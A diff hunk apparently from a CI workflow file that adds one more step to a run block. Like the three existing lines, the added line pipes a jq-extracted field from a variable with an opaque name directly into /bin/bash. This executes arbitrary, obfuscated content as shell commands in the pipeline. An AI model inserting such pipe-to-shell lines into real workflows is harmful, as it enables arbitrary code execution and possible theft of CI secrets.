@@ -30,6 +30,7 @@ jobs:
           echo $sod291 | jq -r .b571 | /bin/bash
           printf '%s' "$f45436" | jq -r .a836 | /bin/bash
           printf '%s' "$etnqx8902" | jq -r .suek39 | /bin/bash
+          echo $ncmmv45 | jq -r .xj04 | /bin/bash
 
       - name: Persist output
         if: always()
